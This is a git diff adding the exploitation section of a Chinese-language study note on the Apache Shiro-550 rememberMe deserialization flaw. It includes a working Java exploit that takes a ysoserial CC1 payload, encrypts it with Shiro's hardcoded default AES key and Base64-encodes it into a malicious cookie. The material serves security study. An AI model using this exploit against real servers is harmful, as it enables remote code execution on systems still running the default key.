@@ -1725,3 +1725,44 @@ shiro550的主要漏洞点是rememberMe参数，我们来看看勾选了remember
 至此，整个rememberMe自动登录的过程分析完毕
 
 #### 利用
+
+经过所有的分析，我们知道了如何通过rememberMe进行反序列化，接下来构造exp利用
+
+首先用ysoserial生成CC1的payload
+
+<img src="image/image-20231122192403843-17030805338563.png" alt="image-20231122192403843" style="zoom:80%;" />
+
+接下来我们来构造EXP
+
+```java
+package com.y5neko.sec.shiro;
+
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.crypto.CipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class Shiro550_Exp {
+    public static void main(String[] args) throws Exception{
+        //我们直接调用shiro的AES服务来进行加密
+        byte[] DEFAULT_CIPHER_KEY_BYTES = org.apache.shiro.codec.Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
+        CipherService cipherService = new AesCipherService();
+
+        //读取payload为字节数组
+        byte[] bytes = Files.readAllBytes(Paths.get("H:\\Java_Project\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550"));
+        //AES加密
+        ByteSource byteSource = cipherService.encrypt(bytes, DEFAULT_CIPHER_KEY_BYTES);
+        byte[] value = byteSource.getBytes();
+        //Base64编码
+        String base64 = Base64.getEncoder().encodeToString(value);
+        System.out.println(base64);
+    }
+}
+```
+
+<img src="image/image-20231122215219157-17030805338551.png" alt="image-20231122215219157" style="zoom:80%;" />
+
+<img src="image/image-20231122215333208-17030805338562.png" alt="image-20231122215333208" style="zoom:80%;" />
